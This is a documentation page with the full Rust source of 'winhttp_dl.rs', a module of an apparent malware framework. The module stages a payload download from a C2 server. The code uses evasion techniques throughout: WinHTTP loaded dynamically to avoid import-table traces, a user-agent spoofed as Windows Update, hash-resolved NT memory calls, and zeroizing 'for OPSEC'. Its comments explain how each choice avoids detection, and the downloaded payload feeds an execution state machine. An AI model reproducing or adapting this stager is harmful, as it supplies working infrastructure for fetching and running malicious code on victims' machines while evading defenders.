# crowd — winhttp_dl.rs  (🅱️ B TIER — WinHTTP staged download, non-injection path)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/winhttp_dl.rs` |
| **Lines** | 417 |
| **Tier** | W |
| **Cards** | T019-networking |
| **Role** | WinHTTP staged download |
| **Unsafe blocks** | 8 |

## Purpose

# crowd — winhttp_dl.rs  (🅱️ B TIER — WinHTTP staged download, non-injection path)

Staged payload download via WinHTTP (no WinINet — menor footprint).

## Flujo
1. WinHttpOpen → WinHttpConnect → WinHttpOpenRequest (HTTPS)
2. WinHttpSendRequest / WinHttpReceiveResponse
3. Leer en chunks de `CHUNK_SIZE` bytes
4. Validar SHA-256 de cada chunk contra el digest esperado
5. Ensamblar en un buffer contiguo, intentando MEM_LARGE_PAGES
via NtAllocateVirtualMemory si el proceso tiene SeLockMemoryPrivilege
6. Retorna `NtVecBuf` — owns the NT region (Drop calls NtFreeVirtualMemory
+ zeroizes), or falls back to a normal Vec if large pages unavailable

## OPSEC
- Sin WinINet → no genera eventos de "Internet Explorer cache"
- User-Agent: "Microsoft-CryptoAPI/10.0" (idéntico al de Windows Update)
- Chunks: el servidor controla el tamaño real via Content-Range
- SHA-256 por chunk: si cualquiera falla → abort silencioso

## Constants

- `CHUNK_SIZE`: `usize` = `1024 * 1024` — 1 MB por chunk
- `MAX_RESPONSE`: `usize` = `200 * 1024 * 1024` — 200 MB máximo
- `WINHTTP_ACCESS_TYPE_NO_PROXY`: `u32` = `1`
- `WINHTTP_FLAG_SECURE`: `u32` = `0x00800000`
- `WINHTTP_FLAG_BYPASS_PROXY_CACHE`: `u32` = `0x00000100`
- `NULL_HINT`: `HINTERNET` = `std::ptr::null_mut()`
- `MEM_COMMIT`: `u32` = `0x1000`
- `MEM_RESERVE`: `u32` = `0x2000`
- `MEM_LARGE_PAGES`: `u32` = `0x20000000`
- `PAGE_READWRITE`: `u32` = `0x04`

## Types

### struct `NtVecBuf` (line 43)
A memory region allocated via NtAllocateVirtualMemory (possibly with MEM_LARGE_PAGES).
Owns the allocation and frees it on Drop via NtFreeVirtualMemory.
Falls back to a normal Vec if large page alloc was not used.

### struct `DownloadResult` (line 117)
Resultado de la descarga: buffer con el payload crudo.

### struct `WinHttpFns` (line 383)

## Public API

### `as_ptr` (line 65)
```rust
pub fn as_ptr(&self) -> *const u8
```
Pointer to the start of the payload data.

### `as_mut_ptr` (line 73)
```rust
pub fn as_mut_ptr(&mut self) -> *mut u8
```
Mutable pointer to the start of the payload data.

### `as_slice` (line 81)
```rust
pub fn as_slice(&self) -> &[u8]
```
Slice view of the payload.

### `len` (line 86)
```rust
pub fn len(&self) -> usize { self.len }
```
Length of the payload data.

### `is_large_page` (line 89)
```rust
pub fn is_large_page(&self) -> bool { self.nt_region.is_some() }
```
Whether this buffer is backed by a large-page NtAllocateVirtualMemory region.

### `load_payload_fsm` (line 125)
```rust
pub fn load_payload_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool
```
FSM integration: downloads or loads the payload into the context.

### `download_payload` (line 184)
```rust
pub fn download_payload(
```
Descarga el payload desde `url` (HTTPS).

`chunk_hashes`: slice de N digests SHA-256 (uno por chunk de CHUNK_SIZE).
Si está vacío, no se valida (modo dev — nunca en prod).

## Internal Functions

- `from_nt` (unsafe) — Create from an NtAllocateVirtualMemory region. (line 54)
- `from_vec` — Create from a normal Vec (fallback path). (line 59)
- `drop` (line 93)
- `winhttp_download` (unsafe) (line 193)
- `try_large_page_alloc_and_copy` — Intenta allocar con MEM_LARGE_PAGES vía NtAllocateVirtualMemory. (line 315)
- `clean_close` (line 360)
- `wide` (line 368)
- `load_winhttp` (unsafe) (line 394)

## Macros

- `get!` (macro_rules, line 399)

## Key Dependencies

- `use anyhow::{anyhow, Result};`
- `use sha2::{Digest, Sha256};`
- `use winapi::shared::minwindef::DWORD;`
- `use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};`

## Full Source

```rust
//! # crowd — winhttp_dl.rs  (🅱️ B TIER — WinHTTP staged download, non-injection path)
//!
//! Staged payload download via WinHTTP (no WinINet — menor footprint).
//!
//! ## Flujo
//! 1. WinHttpOpen → WinHttpConnect → WinHttpOpenRequest (HTTPS)
//! 2. WinHttpSendRequest / WinHttpReceiveResponse
//! 3. Leer en chunks de `CHUNK_SIZE` bytes
//! 4. Validar SHA-256 de cada chunk contra el digest esperado
//! 5. Ensamblar en un buffer contiguo, intentando MEM_LARGE_PAGES
//!    via NtAllocateVirtualMemory si el proceso tiene SeLockMemoryPrivilege
//! 6. Retorna `NtVecBuf` — owns the NT region (Drop calls NtFreeVirtualMemory
//!    + zeroizes), or falls back to a normal Vec if large pages unavailable
//!
//! ## OPSEC
//! - Sin WinINet → no genera eventos de "Internet Explorer cache"
//! - User-Agent: "Microsoft-CryptoAPI/10.0" (idéntico al de Windows Update)
//! - Chunks: el servidor controla el tamaño real via Content-Range
//! - SHA-256 por chunk: si cualquiera falla → abort silencioso

#![allow(dead_code)]

use anyhow::{anyhow, Result};
use sha2::{Digest, Sha256};
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
#[allow(unused_imports)] use crate::mega_dbg;

const CHUNK_SIZE:   usize = 1024 * 1024;    // 1 MB por chunk
const MAX_RESPONSE: usize = 200 * 1024 * 1024; // 200 MB máximo

// WinHTTP access flags
const WINHTTP_ACCESS_TYPE_NO_PROXY: u32    = 1;
const WINHTTP_FLAG_SECURE:          u32    = 0x00800000;
const WINHTTP_FLAG_BYPASS_PROXY_CACHE: u32 = 0x00000100;

type HINTERNET = *mut std::ffi::c_void;
const NULL_HINT: HINTERNET = std::ptr::null_mut();

/// A memory region allocated via NtAllocateVirtualMemory (possibly with MEM_LARGE_PAGES).
/// Owns the allocation and frees it on Drop via NtFreeVirtualMemory.
/// Falls back to a normal Vec if large page alloc was not used.
pub struct NtVecBuf {
    /// If Some, this is an NtAllocateVirtualMemory region (base, allocated_size).
    nt_region: Option<(usize, usize)>,
    /// Length of the actual payload data (≤ allocated size).
    len: usize,
    /// If nt_region is None, data lives in this Vec instead.
    vec_fallback: Option<Vec<u8>>,
}

impl NtVecBuf {
    /// Create from an NtAllocateVirtualMemory region.
    unsafe fn from_nt(base: usize, alloc_size: usize, data_len: usize) -> Self {
        Self { nt_region: Some((base, alloc_size)), len: data_len, vec_fallback: None }
    }

    /// Create from a normal Vec (fallback path).
    fn from_vec(v: Vec<u8>) -> Self {
        let len = v.len();
        Self { nt_region: None, len, vec_fallback: Some(v) }
    }

    /// Pointer to the start of the payload data.
    pub fn as_ptr(&self) -> *const u8 {
        match self.nt_region {
            Some((base, _)) => base as *const u8,
            None => self.vec_fallback.as_ref().unwrap().as_ptr(),
        }
    }

    /// Mutable pointer to the start of the payload data.
    pub fn as_mut_ptr(&mut self) -> *mut u8 {
        match self.nt_region {
            Some((base, _)) => base as *mut u8,
            None => self.vec_fallback.as_mut().unwrap().as_mut_ptr(),
        }
    }

    /// Slice view of the payload.
    pub fn as_slice(&self) -> &[u8] {
        unsafe { std::slice::from_raw_parts(self.as_ptr(), self.len) }
    }

    /// Length of the payload data.
    pub fn len(&self) -> usize { self.len }

    /// Whether this buffer is backed by a large-page NtAllocateVirtualMemory region.
    pub fn is_large_page(&self) -> bool { self.nt_region.is_some() }
}

impl Drop for NtVecBuf {
    fn drop(&mut self) {
        if let Some((base, _)) = self.nt_region.take() {
            // Zeroize before freeing (OPSEC)
            unsafe {
                std::ptr::write_bytes(base as *mut u8, 0, self.len);
                let mut free_base: usize = base;
                let mut free_size: usize = 0;
                let _ = crate::recycled::invoke(
                    crate::resolve::compute_hash("NtFreeVirtualMemory"),
                    4,
                    &[
                        (-1isize) as usize,
                        &mut free_base as *mut usize as usize,
                        &mut free_size as *mut usize as usize,
                        0x8000usize, // MEM_RELEASE
                    ],
                );
            }
        }
        // vec_fallback is dropped normally by Rust
    }
}

/// Resultado de la descarga: buffer con el payload crudo.
pub struct DownloadResult {
    /// Payload — either in a large-page NtAllocateVirtualMemory region or a normal Vec.
    pub data: NtVecBuf,
    /// Total de bytes descargados.
    pub size: usize,
}

/// FSM integration: downloads or loads the payload into the context.
pub fn load_payload_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool {
    // 1. Prioridad: Payload embebido en payload_cfg.rs
    if !crate::payload_cfg::PAYLOAD.is_empty() {
        ctx.payload_buffer = crate::payload_cfg::PAYLOAD.to_vec();
        mega_dbg!("Loading[embedded]: {}B copiados desde .rodata", ctx.payload_buffer.len());
        return true;
    }

    // 2. Si hay host C2, descargar vía WinHTTP
    if !ctx.config.c2_host.is_empty() {
        mega_dbg!("Loading[C2]: intentando {}:{}{}",
            ctx.config.c2_host, ctx.config.c2_port, ctx.config.c2_path);
        match download_payload(
            &ctx.config.c2_host,
            &ctx.config.c2_path,
            ctx.config.c2_port,
            &ctx.config.chunk_hashes,
        ) {
            Ok(res) => {
                mega_dbg!("Loading[C2]: OK — {}B descargados (large_page={})",
                    res.size, res.data.is_large_page());
                // Copy into FSM's Vec<u8> payload_buffer.
                // If the data was in a large-page NT region, the copy happens here
                // and the NT region is freed on DownloadResult drop.
                ctx.payload_buffer = res.data.as_slice().to_vec();
                return true;
            }
            Err(e) => {
                mega_dbg!("Loading[C2]: FALLO — {}", e);
                return false;
            }
        }
    }

    // 3. Fallback: Cargar desde disco si hay path
    if !ctx.config.payload_path.is_empty() {
        mega_dbg!("Loading[disco]: leyendo '{}'", ctx.config.payload_path);
        match std::fs::read(&ctx.config.payload_path) {
            Ok(data) => {
                mega_dbg!("Loading[disco]: OK — {}B leídos", data.len());
                ctx.payload_buffer = data;
                return true;
            }
            Err(e) => {
                mega_dbg!("Loading[disco]: FALLO — {} (path='{}')",
                    e, ctx.config.payload_path);
                return false;
            }
        }
    }

    mega_dbg!("Loading: FALLO — sin payload embebido, sin C2, sin --payload");
    false
}

/// Descarga el payload desde `url` (HTTPS).
///
/// `chunk_hashes`: slice de N digests SHA-256 (uno por chunk de CHUNK_SIZE).
///   Si está vacío, no se valida (modo dev — nunca en prod).
pub fn download_payload(
    host:         &str,
    path:         &str,
    port:         u16,
    chunk_hashes: &[[u8; 32]],
) -> Result<DownloadResult> {
    unsafe { winhttp_download(host, path, port, chunk_hashes) }
}

unsafe fn winhttp_download(
    host:         &str,
    path:         &str,
    port:         u16,
    chunk_hashes: &[[u8; 32]],
) -> Result<DownloadResult> {
    use winapi::shared::minwindef::DWORD;

    // Cargar WinHTTP dinámicamente para evitar import en IAT
    let wh = load_winhttp()?;

    // WinHttpOpen — user agent camuflado como Windows Update
    let ua   = wide("Microsoft-CryptoAPI/10.0");
    let sess = (wh.open)(ua.as_ptr(), WINHTTP_ACCESS_TYPE_NO_PROXY, std::ptr::null(), std::ptr::null(), 0);
    if sess.is_null() { return Err(anyhow!("WinHttpOpen failed")); }

    // WinHttpConnect
    let host_w = wide(host);
    let conn = (wh.connect)(sess, host_w.as_ptr(), port, 0);
    if conn.is_null() {
        (wh.close)(sess);
        return Err(anyhow!("WinHttpConnect failed"));
    }

    // WinHttpOpenRequest (GET, HTTPS)
    let verb   = wide("GET");
    let path_w = wide(path);
    let req = (wh.open_request)(
        conn,
        verb.as_ptr(),
        path_w.as_ptr(),
        std::ptr::null(),
        std::ptr::null(),
        std::ptr::null_mut(),
        WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE,
    );
    if req.is_null() {
        (wh.close)(conn);
        (wh.close)(sess);
        return Err(anyhow!("WinHttpOpenRequest failed"));
    }

    // WinHttpSendRequest
    if (wh.send)(req, std::ptr::null(), 0, std::ptr::null_mut(), 0, 0, 0) == 0 {
        (wh.close)(req);
        (wh.close)(conn);
        (wh.close)(sess);
        return Err(anyhow!("WinHttpSendRequest failed"));
    }

    // WinHttpReceiveResponse
    if (wh.recv_response)(req, std::ptr::null_mut()) == 0 {
        (wh.close)(req);
        (wh.close)(conn);
        (wh.close)(sess);
        return Err(anyhow!("WinHttpReceiveResponse failed"));
    }

    // Leer chunks
    let mut assembled: Vec<u8> = Vec::new();
    let mut chunk_idx = 0usize;
    let mut chunk_buf = vec![0u8; CHUNK_SIZE];

    loop {
        let mut downloaded: DWORD = 0;
        // WinHttpQueryDataAvailable
        let mut avail: DWORD = 0;
        if (wh.query_avail)(req, &mut avail) == 0 || avail == 0 {
            break;
        }
        let to_read = (avail as usize).min(CHUNK_SIZE);
        let ok = (wh.read)(req, chunk_buf.as_mut_ptr() as _, to_read as DWORD, &mut downloaded);
        if ok == 0 || downloaded == 0 { break; }

        let got = &chunk_buf[..downloaded as usize];

        // Validar SHA-256 del chunk si se proporcionaron hashes
        if !chunk_hashes.is_empty() {
            let expected_idx = chunk_idx;
            if expected_idx >= chunk_hashes.len() {
                // Más chunks de lo esperado → abort
                clean_close(&wh, req, conn, sess);
                return Err(anyhow!("chunk count exceeds manifest ({} expected)", chunk_hashes.len()));
            }
            let mut h = Sha256::new();
            h.update(got);
            let digest: [u8; 32] = h.finalize().into();
            if digest != chunk_hashes[expected_idx] {
                clean_close(&wh, req, conn, sess);
                return Err(anyhow!("chunk {} SHA-256 mismatch — aborting", expected_idx));
            }
        }

        assembled.extend_from_slice(got);
        chunk_idx += 1;

        if assembled.len() >= MAX_RESPONSE {
            clean_close(&wh, req, conn, sess);
            return Err(anyhow!("response too large (>{} MB)", MAX_RESPONSE / 1024 / 1024));
        }
    }

    clean_close(&wh, req, conn, sess);

    if assembled.is_empty() {
        return Err(anyhow!("empty response from server"));
    }

    // Intentar allocar con NtAllocateVirtualMemory + MEM_LARGE_PAGES.
    // If large pages are available, data stays in the NT region (no redundant copy).
    // Otherwise, fall back to the normal Vec (zero extra copies).
    let size = assembled.len();
    let final_buf = try_large_page_alloc_and_copy(assembled);

    Ok(DownloadResult { data: final_buf, size })
}

/// Intenta allocar con MEM_LARGE_PAGES vía NtAllocateVirtualMemory.
/// Si large pages están disponibles, copia los datos a la región NT y retorna
/// un NtVecBuf que la posee (Drop llama NtFreeVirtualMemory).
/// Si falla (sin SeLockMemoryPrivilege o sin soporte), retorna un NtVecBuf
/// wrapping del Vec original — cero copias extra.
fn try_large_page_alloc_and_copy(assembled: Vec<u8>) -> NtVecBuf {
    unsafe {
        let min_large = winapi::um::memoryapi::GetLargePageMinimum();
        if min_large == 0 {
            return NtVecBuf::from_vec(assembled);
        }

        let data_len = assembled.len();
        let aligned_size = (data_len + min_large - 1) & !(min_large - 1);

        const MEM_COMMIT:      u32 = 0x1000;
        const MEM_RESERVE:     u32 = 0x2000;
        const MEM_LARGE_PAGES: u32 = 0x20000000;
        const PAGE_READWRITE:  u32 = 0x04;

        let mut base: usize = 0;
        let mut size: usize = aligned_size;
        let status = crate::recycled::invoke(
            crate::resolve::compute_hash("NtAllocateVirtualMemory"),
            6,
            &[
                (-1isize) as usize,
                &mut base as *mut usize as usize,
                0usize,
                &mut size as *mut usize as usize,
                (MEM_COMMIT | MEM_RESERVE | MEM_LARGE_PAGES) as usize,
                PAGE_READWRITE as usize,
            ],
        );

        if status != 0 || base == 0 {
            // Large pages unavailable — use normal Vec (no extra copy)
            return NtVecBuf::from_vec(assembled);
        }

        // Copy payload into the large-page region — ONE copy, kept there permanently
        let ptr = base as *mut u8;
        std::ptr::copy_nonoverlapping(assembled.as_ptr(), ptr, data_len);
        // Drop the original Vec — data now lives solely in the NT region
        drop(assembled);

        NtVecBuf::from_nt(base, aligned_size, data_len)
    }
}

fn clean_close(wh: &WinHttpFns, req: HINTERNET, conn: HINTERNET, sess: HINTERNET) {
    unsafe {
        (wh.close)(req);
        (wh.close)(conn);
        (wh.close)(sess);
    }
}

fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

// ── WinHTTP dynamic load ──────────────────────────────────────────────────────

type WinHttpOpenFn    = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;
type WinHttpConnectFn = unsafe extern "system" fn(HINTERNET, *const u16, u16, u32) -> HINTERNET;
type WinHttpOpenReqFn = unsafe extern "system" fn(HINTERNET, *const u16, *const u16, *const u16, *const u16, *mut *const u16, u32) -> HINTERNET;
type WinHttpSendFn    = unsafe extern "system" fn(HINTERNET, *const u16, u32, *mut std::ffi::c_void, u32, u32, usize) -> i32;
type WinHttpRecvFn    = unsafe extern "system" fn(HINTERNET, *mut std::ffi::c_void) -> i32;
type WinHttpQueryFn   = unsafe extern "system" fn(HINTERNET, *mut u32) -> i32;
type WinHttpReadFn    = unsafe extern "system" fn(HINTERNET, *mut std::ffi::c_void, u32, *mut u32) -> i32;
type WinHttpCloseFn   = unsafe extern "system" fn(HINTERNET) -> i32;

struct WinHttpFns {
    open:         WinHttpOpenFn,
    connect:      WinHttpConnectFn,
    open_request: WinHttpOpenReqFn,
    send:         WinHttpSendFn,
    recv_response:WinHttpRecvFn,
    query_avail:  WinHttpQueryFn,
    read:         WinHttpReadFn,
    close:        WinHttpCloseFn,
}

unsafe fn load_winhttp() -> Result<WinHttpFns> {
    use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
    let dll = LoadLibraryA(b"winhttp.dll\0".as_ptr() as _);
    if dll.is_null() { return Err(anyhow!("winhttp.dll not available")); }

    macro_rules! get {
        ($name:literal, $ty:ty) => {{
            let p = GetProcAddress(dll, concat!($name, "\0").as_ptr() as _);
            if p.is_null() { return Err(anyhow!("WinHTTP: {} not found", $name)); }
            std::mem::transmute::<_, $ty>(p)
        }};
    }

    Ok(WinHttpFns {
        open:          get!("WinHttpOpen",             WinHttpOpenFn),
        connect:       get!("WinHttpConnect",          WinHttpConnectFn),
        open_request:  get!("WinHttpOpenRequest",      WinHttpOpenReqFn),
        send:          get!("WinHttpSendRequest",      WinHttpSendFn),
        recv_response: get!("WinHttpReceiveResponse",  WinHttpRecvFn),
        query_avail:   get!("WinHttpQueryDataAvailable", WinHttpQueryFn),
        read:          get!("WinHttpReadData",         WinHttpReadFn),
        close:         get!("WinHttpCloseHandle",      WinHttpCloseFn),
    })
}

```